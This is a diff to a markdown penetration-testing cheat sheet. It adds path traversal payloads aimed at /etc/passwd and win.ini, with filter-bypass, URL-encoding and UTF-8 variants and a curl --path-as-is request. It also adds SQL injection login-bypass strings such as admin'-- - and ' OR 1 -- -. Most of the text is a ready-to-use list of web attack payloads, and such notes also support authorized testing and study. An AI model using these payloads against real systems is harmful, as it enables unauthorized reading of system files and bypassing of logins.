@@ -9,16 +9,27 @@
 
 ## Path Traversal
 
+!!! tip
+    🍪 Don't forget the `--path-as-is` curl param
+
 ```shell
-cat /etc/passwd # absolute
-cat ../../../../etc/passwd # relative
-
-curl http://192.168.249.16/meteor/index.php?page=../../../../../../../../../etc/passwd
+# linux
+../etc/passwd
+# bypass naive filters
+....//....//etc/passwd
+# URL encoding
+/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+# mixing forward and backward slashes
+..\/..\/..\/etc/passwd
+# escaped characters
+....\/....\/....\/etc/passwd
 # windows
-curl --path-as-is http://192.168.249.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt
+..\..\..\Windows\win.ini
+# UTF-8 encoding bypass
+..%c0%af..%c0%af..%c0%af/etc/passwd
 
-# URL Encoding
-curl http://192.168.249.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+# curl without path normalization or encoding
+curl --path-as-is "http://<url>/index.php?page=../../../etc/passwd"
 ```
 
 ## File Inclusion Vulnerabilities
@@ -157,19 +168,24 @@ select * from offsec.dbo.users;
 
 ### Testing
 
+> <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt>
+
 ```shell
 ' OR '1
 ' OR 1 -- -
 " OR "" = "
 " OR 1 = 1 -- -
+'OR "='
 '='
 'LIKE'
 '=0--+
+admin'-- -
+admin'--
 ```
 
 ### Union
 
-****Requirements**:
+**Requirements**:
 
 1. The injected **UNION** query has to include the same number of columns as the original query.
 2. The data types need to be compatible between each column.
